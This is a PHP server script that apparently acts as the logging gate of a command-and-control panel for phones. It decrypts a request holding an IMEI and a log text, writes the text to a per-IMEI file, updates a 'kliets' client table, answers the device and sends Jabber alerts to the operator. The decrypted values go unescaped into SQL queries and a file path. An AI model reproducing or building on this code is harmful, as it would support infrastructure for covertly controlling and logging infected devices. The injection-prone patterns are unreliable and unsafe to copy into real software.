<?php  
include 'crypt.php';
include 'db.php';
include 'admin/func.php';


$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

$massivReq = explode("|", $request);
$IMEI_log = $massivReq[0]; 
$text_log = $massivReq[1]; 

echo "$IMEI_log $text_log";

if(($IMEI_log != "") && ($text_log != ""))
{
	$path_log = "logs/$IMEI_log.log";	
	$perehod = "\n";
	$str_log = "$IMEI_log: $text_log$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);

	$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);
	$data_ = date('Y-m-d H:i');
	$sql3 = "UPDATE kliets SET lastConnect = '$data_' WHERE IMEI = '$IMEI_log';";
	$mysqli->query($sql3);
	
	$sql3 = "UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log';";
	$mysqli->query($sql3);
	
	$time =time();
	$sql4 = "INSERT INTO `logs` SET `IMEI` = '$IMEI_log', `text` = '$text_log', `date` = '$time';";
	$mysqli->query($sql4);

	checkAndAnswer($IMEI_log, $text_log, $mysqli);

	 # send dedicaded event to jabber clients
	 if (check_imei_event($IMEI_log, $mysqli)){
	 	send_jabber_event('dedicated_event', $IMEI_log.":log update ".$str_log, $mysqli);
	 }
		
}
?>